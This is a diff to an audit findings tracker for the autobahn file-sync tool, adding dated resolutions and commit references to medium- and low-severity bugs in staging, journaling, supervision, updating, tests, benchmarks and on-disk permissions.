@@ -611,12 +799,16 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:2181-2240`
 - **What:** The staged-use counter decrements before the publisher opens the source. With two users of one digest, the last decrementer renames the blob before the first opens it: spurious "staged content unavailable", retransfer, extra cycle.
 - **Fix:** open before decrementing, or wait for earlier users.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-STAGE](fixes/F-M-STAGE-staging-and-apply.md).
+- **Implemented (2026-09-24):** `3fbbced`, `418db0d`, `633303e`. See `IMPLEMENTATION.md`.
 
 #### M-30. Leftover `.autobahn-tmp-apply-*` files are never cleaned up and wedge directory deletion
 
 - **Sources:** OPUS M3 (Confirmed)
 - **Where:** `src/endpoint/local.rs:2233,2498-2509`; `src/scan/mod.rs:612`
 - **What:** The scan hides them; `remove_directory` treats one as unexpected content, a disagreement, so the baseline is distrusted and a full walk runs every cycle indefinitely. They also leak GBs after a crash mid-copy.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-STAGE](fixes/F-M-STAGE-staging-and-apply.md).
+- **Implemented (2026-09-24):** `3fbbced`, `418db0d`, `633303e`. See `IMPLEMENTATION.md`.
 
 #### M-31. A staging base that changes mid-stream fails the whole cycle
 
@@ -624,6 +816,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:922-973`; `src/rsync/mod.rs:379-398`
 - **What:** A destination base truncated between `stage_begin` and the push makes `patch` hit EOF and the entire staging stream errors. Source-side changes are handled quietly; this should be too.
 - **Fix:** discard that file and retransfer.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-STAGE](fixes/F-M-STAGE-staging-and-apply.md).
+- **Implemented (2026-09-24):** `3fbbced`, `418db0d`, `633303e`. See `IMPLEMENTATION.md`.
 
 #### M-32. A corrupted length field in a middle journal record is read as a torn tail; later records are dropped permanently
 
@@ -631,30 +825,40 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/session/ancestor.rs:727-739`
 - **What:** The digest covers generation and payload but not the length. Every later acknowledged record is dropped and normalization makes it permanent, rolling the ancestor back silently.
 - **Fix:** checksum the header; treat the file as torn only when the header is valid.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-STATE](fixes/F-M-STATE-journal-and-reconcile.md).
+- **Implemented (2026-09-24):** `339e4f2`, `b5750eb`, `f227563`. See `IMPLEMENTATION.md`.
 
 #### M-33. One-way modes never converge when the beta copy holds ignored content
 
 - **Sources:** OPUS M2 (Likely)
 - **Where:** `src/tree/reconcile.rs:566-570,656-660`
 - **What:** The deletion's `old` is `beta.cloned()`, not `beta_sync`. Removal refuses, the next cycle re-proposes it, forever. `unsynchronizable_content_never_travels` checks only `new`.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-STATE](fixes/F-M-STATE-journal-and-reconcile.md).
+- **Implemented (2026-09-24):** `339e4f2`, `b5750eb`, `f227563`. See `IMPLEMENTATION.md`.
 
 #### M-34. A worker panic kills a session silently; logging can panic on EPIPE/ENOSPC
 
 - **Sources:** OPUS M4 (Confirmed)
 - **Where:** `src/supervisor/mod.rs:706-760`; `src/logging.rs:115-140`
 - **What:** `println!`/`eprintln!` panic when `watch` is piped to a process that exits or the disk under `service.log` is full. No `catch_unwind`; the status file keeps saying "synchronized" and no alert fires.
+- **Resolution (2026-09-24):** Decided: contain a panic to its session. The session is marked errored, alerts, restarts with backoff, and halts after repeated panics; logging can no longer panic. Ticket [F-M-SUP](fixes/F-M-SUP-supervisor-robustness.md).
+- **Implemented (2026-09-24):** `29f368b`, `33821a6`, `56dc392`, `611054c`, `88cf319`, `b1b1463`. See `IMPLEMENTATION.md`.
 
 #### M-35. Alert hooks can hang forever, and their stderr is lost
 
 - **Sources:** OPUS M12 (Confirmed)
 - **Where:** `src/alerts.rs:488-523`
 - **What:** `stdin.write_all` runs before the timeout loop, so a hook that does not read stdin blocks indefinitely and later alerts are skipped. stderr is piped and never read although `docs/alerts.md` says it goes to the log.
+- **Resolution (2026-09-24):** Confirmed at `src/alerts.rs:510-512`. Ticket [F-M-SUP](fixes/F-M-SUP-supervisor-robustness.md).
+- **Implemented (2026-09-24):** `29f368b`, `33821a6`, `56dc392`, `611054c`, `88cf319`, `b1b1463`. See `IMPLEMENTATION.md`.
 
 #### M-36. `sync` exits 0 with conflicts or blocked paths
 
 - **Sources:** OPUS M13 (Confirmed)
 - **Where:** `src/main.rs:952-986,1165-1190`
 - **What:** The docs sell `sync` for scripts that need a status code.
+- **Resolution (2026-09-24):** [OPS-1](fixes/OPS-1-sync-exit-codes.md).
+- **Implemented (2026-09-24):** `65df9ac`. See `IMPLEMENTATION.md`.
 
 #### M-37. The remote install script assumes a POSIX login shell
 
@@ -662,6 +866,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/transport/install.rs:213-221`
 - **What:** `tmp=…`, `$$` and `{ …; }` fail under fish and tcsh, so those hosts can never be bootstrapped. The fake-ssh test runs `/bin/sh -c` so it cannot see this.
 - **Fix:** wrap in `sh -c '…'`.
+- **Resolution (2026-09-24):** [OPS-3](fixes/OPS-3-posix-install-script.md).
+- **Implemented (2026-09-24):** `c05ecf1`. See `IMPLEMENTATION.md`.
 
 #### M-38. Rejected configuration breaks status visibility
 
@@ -669,6 +875,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/main.rs:3118,1971`; `src/shop.rs:190`
 - **What:** Status and UI parse the edited on-disk config before reading the still-running inventory or rejection notice; a syntax error hides the sessions the supervisor deliberately retained. An open TUI keeps its original plan list after a topology reload.
 - **Fix:** expose the supervisor's active inventory independently of the candidate config.
+- **Resolution (2026-09-24):** Confirmed at `src/main.rs:3419`. `status`, the shop and the tray will ask the running supervisor for its sessions. Ticket [F-M-SUP](fixes/F-M-SUP-supervisor-robustness.md).
+- **Implemented (2026-09-24):** `29f368b`, `33821a6`, `56dc392`, `611054c`, `88cf319`, `b1b1463`. See `IMPLEMENTATION.md`.
 
 #### M-39. Containment checks miss the filesystem root and trailing separators
 
@@ -676,6 +884,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/config.rs:697,1371`
 - **What:** String-prefix containment strips the outer path and requires the remainder to begin with `/`; outer `/` and inner `/srv/project` leave `srv/project`. Remote roots ending in `/` have the same problem.
 - **Fix:** separate remote authority from path, normalize, component-aware ancestry.
+- **Resolution (2026-09-24):** Fixed with H-2 in [F-H2](fixes/F-H2-manual-sync-topology.md), which replaces the string-prefix test in `overlap` (`src/config.rs:707`) with a comparison of path components.
+- **Implemented (2026-09-24):** `b5750eb`, `dc04b1c`. See `IMPLEMENTATION.md`.
 
 #### M-40. Updater rollback restores only the CLI binary, not the agent bundle
 
@@ -683,6 +893,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/update.rs:137-146,239,383,395-405`
 - **What:** The bundle is refreshed and the previous one deleted before the CLI is installed. If restart fails, the rolled-back controller bootstraps agents from the incompatible new bundle and fails version handshakes.
 - **Fix:** roll back binary and bundle together as one recoverable operation.
+- **Resolution (2026-09-24):** Confirmed: `refresh_agents` deletes `agents.previous` before the restart (`src/update.rs:395`). Ticket [F-M-UPD](fixes/F-M-UPD-updater-and-service.md).
+- **Implemented (2026-09-24):** `59c7b68`. See `IMPLEMENTATION.md`.
 
 #### M-41. Updater success does not establish that the service runs the updated executable
 
@@ -690,6 +902,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/update.rs:791`; `src/service.rs:98`
 - **What:** Service install records `current_exe`; update defaults to `~/.local/bin`. A service installed elsewhere restarts its old binary and passes the "running" check.
 - **Fix:** resolve or retarget the registered executable; verify the running version.
+- **Resolution (2026-09-24):** Confirmed: the service records `current_exe()`, and `confirm_running` checks only the state. Ticket [F-M-UPD](fixes/F-M-UPD-updater-and-service.md).
 
 #### M-59. A detached mount under `ignore_mounts = false` reports "synchronized" while the two sides differ
 
@@ -699,6 +912,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Fix:** [MAC-1](fixes/MAC-1-detached-mount-not-halted.md). Either drop the boundary with the flag, or report it; a session whose sides differ must not read `synchronized`.
 
 ### Peering (experimental), additional
+- **Implemented (2026-09-24):** `59c7b68`. See `IMPLEMENTATION.md`.
 
 #### M-42. Peering temporary filenames collide between channel threads
 
@@ -743,6 +957,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `tests/e2e.rs:1723-1729`
 - **What:** Stops on the first cycle where beta's scan is not skipped, then requires the latest beta edit on alpha. A delayed event from an earlier transition satisfies the stop while the new edit is unobserved. Evidence points to a test flaw, not proven production loss.
 - **Fix:** bounded user-visible convergence or observed generation; separately test late events and polling.
+- **Resolution (2026-09-24):** Partly fixed since the review: the test now waits up to four cycles, but still stops at the first scan. Ticket [F-M-TEST](fixes/F-M-TEST-test-suite.md).
+- **Implemented (2026-09-24):** `0baf70a`, `3a61f13`, `8091f45`, `eb46d11`. See `IMPLEMENTATION.md`.
 
 #### M-47. The connection-cut oracle can accept loss of the latest user versions
 
@@ -750,6 +966,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `tests/e2e.rs:879`
 - **What:** Permits old or new bytes for a modified file and absence or new bytes for a created file, then requires equal trees when conflict-free. Both sides reverting, or both losing the new file, passes.
 - **Fix:** require each unsuperseded user value to survive somewhere and conflict-free recovery to converge to the expected result; extend the fault matrix.
+- **Resolution (2026-09-24):** Confirmed at `tests/e2e.rs:885-887`. Ticket [F-M-TEST](fixes/F-M-TEST-test-suite.md).
+- **Implemented (2026-09-24):** `0baf70a`, `3a61f13`, `8091f45`, `eb46d11`. See `IMPLEMENTATION.md`.
 
 #### M-48. Benchmark source changes bypass CI; the harness package is never built or tested
 
@@ -763,6 +981,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Sources:** ASTRA F36 (P2); OPUS CI gaps
 - **Where:** `ci.yml:109`, `apps/macos/build.sh:23`, `src/tray.rs:1295`
 - **Resolution, Linux half (2026-09-24):** Linux tray is not built in CI or releases, and won't be. `docs/macos-app.md` now has an "On Linux (experimental, unverified)" build-it-yourself section, and README and the app doc no longer claim Linux support. The guide also flags that `src/tray.rs` never initializes GTK, so a Linux build may show no icon. Making it a supported platform is an entry in `WISHLIST.md`. The macOS half, running tray tests in CI, is part of the 4d decision, still pending.
+- **Resolution (2026-09-24):** The macOS half is [CI-09](fixes/CI-09-macos-tray-tests.md).
+- **Implemented (2026-09-24):** `297dcc9`. See `IMPLEMENTATION.md`.
 
 #### M-50. `bench/ab.sh --remote` verifies the wrong filesystem
 
@@ -770,6 +990,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `bench/ab.sh:112,129,138`
 - **What:** `--remote` changes the destination and agent command but creation, cleanup, manifest checks, the observer and the observer address remain local; the cold-sync loop checks the empty local destination for ten minutes and does not treat timeout as failure; binaries are not provisioned remotely.
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-4](fixes/BENCH-4-ab-remote.md).
+- **Implemented (2026-09-24):** `88bc1ce`. See `IMPLEMENTATION.md`.
 
 #### M-51. Cold-sync aggregation includes destination-width-contaminated jobs
 
@@ -777,6 +998,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `bench/aggregate.py:255`
 - **What:** Latency/resource aggregation excludes tainted jobs; cold-sync aggregation does not.
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-5](fixes/BENCH-5-result-accuracy.md).
+- **Implemented (2026-09-24):** `45cf9a2`. See `IMPLEMENTATION.md`.
 
 #### M-52. Verification scripts and the CLI tour invoke the removed `up` subcommand; `scripts/mi` writes to the real `~/.autobahn`
 
@@ -785,29 +1007,36 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Fix:** update to `watch`/`sync`; fail immediately when the subject does not start.
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-6](fixes/BENCH-6-removed-up-command.md).
 - **Correction (2026-09-24):** Eleven scripts call the removed command, not three: `scripts/mi` and ten in `bench/verify/`.
+- **Implemented (2026-09-24):** `cd6bc32`. See `IMPLEMENTATION.md`.
 
 #### M-53. Unit tests write to the real `~/.autobahn`, share session ids, and mutate global environment
 
 - **Sources:** OPUS §5 suite health
 - **Where:** `src/transport/mux.rs` tests (`serve_agent` → `create_endpoint` with real `$HOME`; rewrote `~/.autobahn/staging/mux-test-17-beta.scancache` during review; `remove_dir_all` under it), all 8 mux tests use `mux-test-17`; `install.rs:399` sets `HOME`; `supervisor.rs:1177` sets `AUTOBAHN_SSH`/`AUTOBAHN_AGENTS_DIR` and never unsets; `ATTACH_COMMAND_VARIABLE` leaks on panic (all become `unsafe` under edition 2024)
 - **Fix:** isolate `HOME` in unit tests; unique session ids.
+- **Resolution (2026-09-24):** Confirmed: `mux-test-{len}` ids (`src/transport/mux.rs:644`) and unrestored `set_var` calls. Ticket [F-M-TEST](fixes/F-M-TEST-test-suite.md).
+- **Implemented (2026-09-24):** `0baf70a`, `3a61f13`, `8091f45`, `eb46d11`. See `IMPLEMENTATION.md`.
 
 #### M-54. Two tests pass without running; fixed-sleep negative checks
 
 - **Sources:** OPUS §5
 - **What:** TLC replay tests return early without `AUTOBAHN_TLC=1` and report `ok`; so does the non-UTF-8 test on APFS. 500 ms/3 s/300 ms sleeps can pass with broken behavior; wall-clock bounds risky on the FreeBSD VM.
 - **Fix:** `#[ignore]` or a visible skip.
+- **Resolution (2026-09-24):** Confirmed at `tests/spec_replay.rs:694`. Ticket [F-M-TEST](fixes/F-M-TEST-test-suite.md).
+- **Implemented (2026-09-24):** `0baf70a`, `3a61f13`, `8091f45`, `eb46d11`. See `IMPLEMENTATION.md`.
 
 #### M-55. `bench/job.py` CPU aggregation can decrease when a host misses a bucket
 
 - **Sources:** ASTRA cautions
 - **Fix:** per-host window deltas before summing.
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-5](fixes/BENCH-5-result-accuracy.md).
+- **Implemented (2026-09-24):** `45cf9a2`. See `IMPLEMENTATION.md`.
 
 #### M-56. `examples/cycle_cost.rs` includes full synchronous ancestor serialization in its total, unlike the journaled production cycle
 
 - **Sources:** ASTRA cautions
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-5](fixes/BENCH-5-result-accuracy.md).
+- **Implemented (2026-09-24):** `45cf9a2`. See `IMPLEMENTATION.md`.
 
 #### M-57. `orchestrate.py` interpolates remote output into `shell=True` commands
 
@@ -816,91 +1045,101 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `json.dumps` does not escape single quotes; a tampered instance returns a key line that executes on the operator's workstation.
 - **Fix:** `shlex.quote` or argv lists.
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-3](fixes/BENCH-3-orchestrate-shell.md).
+- **Implemented (2026-09-24):** `6e84611`. See `IMPLEMENTATION.md`.
 
 #### M-58. Release tags build without running tests; a tag can point at a commit CI skipped
 
 - **Sources:** OPUS CI gaps
 - **What:** `paths-ignore` or `[skip mac]` can leave a tagged commit untested; examples compile but never run.
+- **Resolution (2026-09-24):** [CI-08](fixes/CI-08-release-requires-green-ci.md).
 
 ---
+- **Implemented (2026-09-24):** `b5750eb`, `c4b7c2e`, `e1bdf60`. See `IMPLEMENTATION.md`.
 
 ## Low
 
 ### Permissions and state on disk
 
-- **L-1. `config.toml`, the state root, session directories and status files are created with the default umask (world-readable).** DEEPSEEK F17, F18; GLM L2; KIMI ABN-L1 (Confirmed); OPUS Low. `src/main.rs:2663,2674-2677`, `src/paths.rs:54-58`, `src/persist.rs:226-234`, `src/session/mod.rs:1213-1252`, `src/supervisor/mod.rs:2280-2285`, `src/service.rs:38-39`, `src/peering.rs:246-268`. `init`/`disable`/`enable` rewrite the config at umask defaults, relaxing a user-hardened 0600. The state root is 0700 only as a side effect of `control::bind`; manual `sync` or the fallback socket leaves ancestors at 0644. `Config::load` does no ownership/writability check despite carrying executable hooks. Fix: 0700 state root enforced at startup, 0600 files, preserve config mode, ssh-style warn/refuse on group/world-writable config. **Resolution (2026-09-24):** Fault, [LOCAL-02](fixes/LOCAL-02-state-and-config-permissions.md).
-- **L-2. Predictable pid-based temp names in shared directories.** DEEPSEEK F16; KIMI ABN-M2. `src/persist.rs:226-233`, `src/session/ancestor.rs:193-200`, `src/update.rs:341,402-404`, `scripts/install.sh:152-155`, supervisor/reload/peer. Safe inside the owner-only state root; exploitable if `AUTOBAHN_HOME` is group-writable. Fix: randomized names, `O_EXCL`/`O_NOFOLLOW`. **Resolution (2026-09-24):** Fault, [LOCAL-02](fixes/LOCAL-02-state-and-config-permissions.md).
-- **L-3. In-place chmod on hardlinked inodes.** KIMI ABN-L3 (Likely). `src/endpoint/local.rs:2607`. macOS has no `protected_hardlinks`; a root-running agent's exec-bit flip chmods the shared inode. Fix: publish mode changes by rename or refuse on multiply-linked files. **Resolution (2026-09-24):** Fault, [LOCAL-11](fixes/LOCAL-11-hardlink-chmod.md). **Reproduced on macOS (MAC-BENCH 7f):** a `0644` file outside the root, hard-linked in, became `-rwx------` on both names, same inode, two links — so the outside file did not merely gain `+x`, it was rewritten to the session's `file_mode`.
-- **L-4. `base_signature` lstat-then-open race is an rsync-signature oracle.** KIMI ABN-L4 (Likely). `src/endpoint/local.rs:3001-3008`. Fix: `O_NOFOLLOW` + `fstat`. **Resolution (2026-09-24):** Covered, [T1-5](fixes/T1-5-staging-request-paths.md).
+- **L-1. `config.toml`, the state root, session directories and status files are created with the default umask (world-readable).** DEEPSEEK F17, F18; GLM L2; KIMI ABN-L1 (Confirmed); OPUS Low. `src/main.rs:2663,2674-2677`, `src/paths.rs:54-58`, `src/persist.rs:226-234`, `src/session/mod.rs:1213-1252`, `src/supervisor/mod.rs:2280-2285`, `src/service.rs:38-39`, `src/peering.rs:246-268`. `init`/`disable`/`enable` rewrite the config at umask defaults, relaxing a user-hardened 0600. The state root is 0700 only as a side effect of `control::bind`; manual `sync` or the fallback socket leaves ancestors at 0644. `Config::load` does no ownership/writability check despite carrying executable hooks. Fix: 0700 state root enforced at startup, 0600 files, preserve config mode, ssh-style warn/refuse on group/world-writable config. **Resolution (2026-09-24):** Fault, [LOCAL-02](fixes/LOCAL-02-state-and-config-permissions.md). **Implemented (2026-09-24):** `b9ee1c2`, `f0b7d75`.
+- **L-2. Predictable pid-based temp names in shared directories.** DEEPSEEK F16; KIMI ABN-M2. `src/persist.rs:226-233`, `src/session/ancestor.rs:193-200`, `src/update.rs:341,402-404`, `scripts/install.sh:152-155`, supervisor/reload/peer. Safe inside the owner-only state root; exploitable if `AUTOBAHN_HOME` is group-writable. Fix: randomized names, `O_EXCL`/`O_NOFOLLOW`. **Resolution (2026-09-24):** Fault, [LOCAL-02](fixes/LOCAL-02-state-and-config-permissions.md). **Implemented (2026-09-24):** `b9ee1c2`, `f0b7d75`.
+- **L-3. In-place chmod on hardlinked inodes.** KIMI ABN-L3 (Likely). `src/endpoint/local.rs:2607`. macOS has no `protected_hardlinks`; a root-running agent's exec-bit flip chmods the shared inode. Fix: publish mode changes by rename or refuse on multiply-linked files. **Resolution (2026-09-24):** Fault, [LOCAL-11](fixes/LOCAL-11-hardlink-chmod.md). **Implemented (2026-09-24):** `c835d9f`. **Reproduced on macOS (MAC-BENCH 7f):** a `0644` file outside the root, hard-linked in, became `-rwx------` on both names, same inode, two links — so the outside file did not merely gain `+x`, it was rewritten to the session's `file_mode`.
+- **L-4. `base_signature` lstat-then-open race is an rsync-signature oracle.** KIMI ABN-L4 (Likely). `src/endpoint/local.rs:3001-3008`. Fix: `O_NOFOLLOW` + `fstat`. **Resolution (2026-09-24):** Covered, [T1-5](fixes/T1-5-staging-request-paths.md). **Implemented (2026-09-24):** `bd67173`, `e55c2f7`.
 - **L-5. Watch-setup symlink TOCTOU.** KIMI ABN-L6 (Suspected). `src/endpoint/local.rs:242,266,401-408`. Watches an outside path; events fail `strip_prefix` and degrade to full rescans. **Resolution (2026-09-24):** Documented boundary, [LOCAL-10](fixes/LOCAL-10-descriptor-relative-rewrite.md).
-- **L-6. No root/sudo guard.** KIMI ABN-L12 (Likely). No euid check; under sudo on macOS `$HOME` is the caller's, so `sudo autobahn watch` creates root-owned state and `sudo autobahn install` registers a root service reading a user-writable config with hooks. Fix: refuse mutating subcommands at euid 0 without an override. **Resolution (2026-09-24):** Fault, [LOCAL-08](fixes/LOCAL-08-refuse-root.md). **Reproduced on macOS (MAC-BENCH 7g):** `sudo autobahn watch --state-root …` left root-owned state in the user's directory, and — because macOS `sudo` keeps `$HOME` — read the user's real config and supervised ten live sessions as root, leaving a root-owned `peering/lease.json` the user's own supervisor can no longer renew. On Ubuntu `env_reset` gives root its own `$HOME`, so the default path differs while the missing ownership check does not.
-- **L-7. `run_sync` never expands `~` in endpoint arguments.** KIMI ABN-L13 (Confirmed). `src/main.rs:841-846`. A quoted `~/backup` becomes a literal `./~` tree.
+- **L-6. No root/sudo guard.** KIMI ABN-L12 (Likely). No euid check; under sudo on macOS `$HOME` is the caller's, so `sudo autobahn watch` creates root-owned state and `sudo autobahn install` registers a root service reading a user-writable config with hooks. Fix: refuse mutating subcommands at euid 0 without an override. **Resolution (2026-09-24):** Fault, [LOCAL-08](fixes/LOCAL-08-refuse-root.md). **Implemented (2026-09-24):** `3451d3f`, `b5750eb`, `e219e67`. **Reproduced on macOS (MAC-BENCH 7g):** `sudo autobahn watch --state-root …` left root-owned state in the user's directory, and — because macOS `sudo` keeps `$HOME` — read the user's real config and supervised ten live sessions as root, leaving a root-owned `peering/lease.json` the user's own supervisor can no longer renew. On Ubuntu `env_reset` gives root its own `$HOME`, so the default path differs while the missing ownership check does not.
+- **L-7. `run_sync` never expands `~` in endpoint arguments.** KIMI ABN-L13 (Confirmed). `src/main.rs:841-846`. A quoted `~/backup` becomes a literal `./~` tree. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
 
 ### Wire and protocol hardening
 
-- **L-8. `bincode` decodes use no explicit `with_limit`; bincode 1.3 is unmaintained (RUSTSEC-2025-0141).** DEEPSEEK F13; KIMI ABN-L16 (Suspected); OPUS Low. `src/transport/mod.rs:413-415,1163-1166`, `src/endpoint/remote.rs:241`, `src/session/ancestor.rs:647-679,744`. Slice-reader bounds and serde's cautious prealloc currently mitigate. Fix: state the limit in autobahn's code; plan bincode 2 migration (the epoch mechanism makes it feasible). The tray feature also pulls unmaintained GTK3 bindings and an unsound `glib 0.18`.
-- **L-9. `Response::Scan` snapshots are not structurally validated (the delta path is); the variant is otherwise dead.** DEEPSEEK F23; KIMI ABN-L5 (Confirmed); OPUS Low. `src/endpoint/remote.rs:136-153`. Unsorted/duplicate children violate the ordering every merge assumes. Fix: `snapshot.root.validate(false)` on this arm, or remove the variant.
-- **L-10. Oversized `AncestorRecord` wedges a follower permanently.** KIMI ABN-L7 (Likely). `src/session/ancestor.rs:721,731`. The 1 GiB cap is enforced on read, not append; a leader's oversized record fails every subsequent open until manual `reset`. Deferred past v1: ticket [PEER-7](fixes/PEER-7-ancestor-replica.md).
-- **L-11. Peer can pin the client at 100% duty cycle.** KIMI ABN-L8 (Likely). `src/supervisor/mod.rs:1100-1140`. Instant `changed` answers defeat the interval cadence with no error, so backoff never applies. Fix: minimum cycle period.
-- **L-12. Unbounded readdir materialization; `max_entry_count` checked only after the walk.** KIMI ABN-L10 (Confirmed). `src/scan/mod.rs:1059-1067`, `src/endpoint/observer.rs:401-405`. Fix: enforce the budget incrementally.
-- **L-13. No mount-point (`st_dev`) boundary in the scanner.** KIMI ABN-L11 (Confirmed). `src/scan/mod.rs:851`. Unprivileged FUSE mounts control lstat/readdir/read timing (enabler for M-16, L-12, H-5). Fix: refuse to cross devices by default.
-- **L-14. Scan-delta desync on reassembly error.** OPUS Low. `src/endpoint/remote.rs:141-187`. Safe only because every caller drops the session; set `last_snapshot = None` on any failure.
-- **L-15. Digest reuse ignores ctime.** OPUS Low. `src/scan/mod.rs:1119-1123`. `touch -r` and `cp -p` over an existing inode are invisible; git records ctime.
+- **L-8. `bincode` decodes use no explicit `with_limit`; bincode 1.3 is unmaintained (RUSTSEC-2025-0141).** DEEPSEEK F13; KIMI ABN-L16 (Suspected); OPUS Low. `src/transport/mod.rs:413-415,1163-1166`, `src/endpoint/remote.rs:241`, `src/session/ancestor.rs:647-679,744`. Slice-reader bounds and serde's cautious prealloc currently mitigate. Fix: state the limit in autobahn's code; plan bincode 2 migration (the epoch mechanism makes it feasible). The tray feature also pulls unmaintained GTK3 bindings and an unsound `glib 0.18`. **Resolution (2026-09-24):** The move off bincode 1.x is on `WISHLIST.md`, to go with the next epoch bump. The GTK and `glib` advisories affect only the unshipped Linux tray; see CI-10 and the wishlist.
+- **L-9. `Response::Scan` snapshots are not structurally validated (the delta path is); the variant is otherwise dead.** DEEPSEEK F23; KIMI ABN-L5 (Confirmed); OPUS Low. `src/endpoint/remote.rs:136-153`. Unsorted/duplicate children violate the ordering every merge assumes. Fix: `snapshot.root.validate(false)` on this arm, or remove the variant. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
+- **L-10. Oversized `AncestorRecord` wedges a follower permanently.** KIMI ABN-L7 (Likely). `src/session/ancestor.rs:721,731`. The 1 GiB cap is enforced on read, not append; a leader's oversized record fails every subsequent open until manual `reset`. **Resolution (2026-09-24):** deferred past v1, ticket [PEER-7](fixes/PEER-7-ancestor-replica.md).
+- **L-11. Peer can pin the client at 100% duty cycle.** KIMI ABN-L8 (Likely). `src/supervisor/mod.rs:1100-1140`. Instant `changed` answers defeat the interval cadence with no error, so backoff never applies. Fix: minimum cycle period. **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model.
+- **L-12. Unbounded readdir materialization; `max_entry_count` checked only after the walk.** KIMI ABN-L10 (Confirmed). `src/scan/mod.rs:1059-1067`, `src/endpoint/observer.rs:401-405`. Fix: enforce the budget incrementally. **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model.
+- **L-13. No mount-point (`st_dev`) boundary in the scanner.** KIMI ABN-L11 (Confirmed). `src/scan/mod.rs:851`. Unprivileged FUSE mounts control lstat/readdir/read timing (enabler for M-16, L-12, H-5). Fix: refuse to cross devices by default. **Resolution (2026-09-24):** Closed. `ignore_mounts` defaults to `true` and already keeps mounts out of a root (`docs/configuration.md:75`); the finding missed that setting.
+- **L-14. Scan-delta desync on reassembly error.** OPUS Low. `src/endpoint/remote.rs:141-187`. Safe only because every caller drops the session; set `last_snapshot = None` on any failure. **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model.
+- **L-15. Digest reuse ignores ctime.** OPUS Low. `src/scan/mod.rs:1119-1123`. `touch -r` and `cp -p` over an existing inode are invisible; git records ctime. **Resolution (2026-09-24):** Kept as is, per `RETAINED.md` §5; documented by [OPS-5](fixes/OPS-5-doc-notes.md). **Implemented (2026-09-24):** `7b8dcb9`.
 
 ### Journal, session and supervisor robustness
 
-- **L-16. Journal directory entry not synced.** OPUS Low. `src/session/ancestor.rs:398-401,507-514`. A journal created by `checkpoint()` never has its directory entry synced; a later durable `intend()` skips it.
-- **L-17. Intents can be lost at open.** OPUS Low. `ancestor.rs:238-268`. A format-upgrade rewrite truncates the journal while intents are unresolved; `stored_generation()` discards the list.
-- **L-18. Compaction failure fails a good cycle.** OPUS Low. `ancestor.rs:376-381`. Loops on FUSE/network homes where directory fsync always fails.
-- **L-19. Silent truncation of results.** OPUS Low. `src/endpoint/mod.rs:119-129`. `achieved_changes` zips results and transitions; a count mismatch leaves a stale ancestor.
-- **L-20. Keep-both rename can overwrite.** OPUS Low. `src/endpoint/local.rs:1353-1371`. `rename()` checks existence then calls plain `fs::rename`; use `publish_rename(…, false)`.
+- **L-16. Journal directory entry not synced.** OPUS Low. `src/session/ancestor.rs:398-401,507-514`. A journal created by `checkpoint()` never has its directory entry synced; a later durable `intend()` skips it. **Resolution (2026-09-24):** ticket [F-L-STATE](fixes/F-L-STATE-durability-nits.md). **Implemented (2026-09-24):** `479840c`, `e2554a9`.
+- **L-17. Intents can be lost at open.** OPUS Low. `ancestor.rs:238-268`. A format-upgrade rewrite truncates the journal while intents are unresolved; `stored_generation()` discards the list. **Resolution (2026-09-24):** ticket [F-L-STATE](fixes/F-L-STATE-durability-nits.md). **Implemented (2026-09-24):** `479840c`, `e2554a9`.
+- **L-18. Compaction failure fails a good cycle.** OPUS Low. `ancestor.rs:376-381`. Loops on FUSE/network homes where directory fsync always fails. **Resolution (2026-09-24):** ticket [F-L-STATE](fixes/F-L-STATE-durability-nits.md). **Implemented (2026-09-24):** `479840c`, `e2554a9`.
+- **L-19. Silent truncation of results.** OPUS Low. `src/endpoint/mod.rs:119-129`. `achieved_changes` zips results and transitions; a count mismatch leaves a stale ancestor. **Resolution (2026-09-24):** ticket [F-L-STATE](fixes/F-L-STATE-durability-nits.md). **Implemented (2026-09-24):** `479840c`, `e2554a9`.
